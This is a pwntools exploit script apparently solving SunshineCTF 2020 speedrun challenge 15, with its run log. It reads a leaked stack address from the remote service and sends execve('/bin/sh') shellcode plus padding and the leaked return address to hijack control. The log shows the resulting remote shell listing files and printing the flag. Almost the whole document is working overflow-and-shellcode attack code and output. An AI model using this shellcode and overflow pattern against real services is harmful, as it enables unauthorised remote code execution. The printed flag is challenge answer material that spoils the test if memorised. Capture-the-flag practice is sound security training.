from pwn import *

e = ELF('./chall_15')

p = remote('chal.2020.sunshinectf.org', 30015)
#p = process('./chall_15')

p.send(b'yolo\n')
p.recvuntil(b': ')

leak = int( p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'), 16)

input('...')

data = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\xcc\xcc\xcc" 
data += p32(0xfacade) * 12
data += p64(leak)

p.send(data)
p.interactive()

'''
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_15'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chal.2020.sunshinectf.org on port 30015: Done
...
[*] Switching to interactive mode
$ ls
$ ls
chall_15
flag.txt
$ cat flag.txt
sun{bat-country-53036e8a423559df}
'''
